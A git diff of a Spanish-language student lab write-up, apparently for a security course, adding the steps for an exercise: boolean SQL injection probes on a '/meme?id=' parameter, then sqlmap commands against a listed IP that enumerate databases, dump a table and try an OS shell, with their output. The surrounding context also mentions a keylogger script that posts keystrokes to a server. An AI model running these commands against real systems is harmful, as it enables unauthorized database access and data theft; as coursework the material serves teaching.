@@ -72,7 +72,66 @@ no encontre una menera facil de hacer un post con el modulo SimpleHTTPServer asi
         </script>  
 basicamente este script mediante  XMLHttpRequest nos envia un post con cada una de las teclas presiondas y las guarda en un archivo data.txt    
 ##### Ej 3
-Para resolver este ejrcicio vimos a que direcciones hacia request la pagina web, y de esta forma vimos que la pagina pedia sus imagenes en la siguiente ruta (server caido)
-investigando mas a fondo en esta ruta notamos que por ejeplo podiamos ingresar en la url cosas como (servercaido) obteniendo una imagen en base64 (es decir, contestaba nuestro request) por ende esto indicaba que probablemente la vulnerabilidad que existe en esta pagina web sea una sql injection.
+Para resolver este ejrcicio vimos a que direcciones hacia request la pagina web, y de esta forma vimos que la pagina pedia sus imagenes en la siguiente ruta /meme?id=
+
+Investigando mas a fondo en esta ruta notamos que por ejeplo podiamos ingresar en la url cosas como /meme?id=1+AND+1=1 nos devuelve una imagen en base64 (es decir, contestaba nuestro request) lo mismo que hacer /meme?id=1 en cambio si hacemos /meme?id=1+AND+1=2 obtenemos un Not Found
+
+Esto indicaba que probablemente la vulnerabilidad que existe en esta pagina web sea una sql injection.
 
 Cuando supimos esto encontramos una herramienta llamada sqlmap la cual nos permitia explotar esta vulnerabilidad y asi poder ver la base de datos de la pagina.
+
+Con el comando: 
+
+        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dbs
+
+pudimos ver que bases de datos contenia la pagina, obteniendo el siguiete output:
+
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+available databases [4]:
+
+[*] information_schema
+
+[*] memes_db
+
+[*] mysql
+
+[*] performance_schema
+
+luego con el siguiente comando
+
+        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --tables -D memes_db
+
+vimos que la bd memes_db contiene las siguietes tablas
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: memes_db
+
+[2 tables]
+
++--------+
+
+| albums |
+
+| memes  |
+
++--------+
+
+con el comando: 
+
+        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dump -T memes -D  memes_db
+
+pudimos ver toda la info de la tabla memes.
+
+Finalmente intentamos con el comando 
+
+        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --os-shell
+
+para ver si podiamos conectarnos a la terminal del back-end pero no fue posible.
+
+Finalmete sqlmap crea un archivo llamado log que almacena todo el output obtenido de las distintas corridas del programa. adjuntamos este archivo en la carpeta ej3 con el output obtenido de distintas ejecuciones. En este resumen incluimos todas las que nos devolvieron informacion util.
+
+
+
+
+
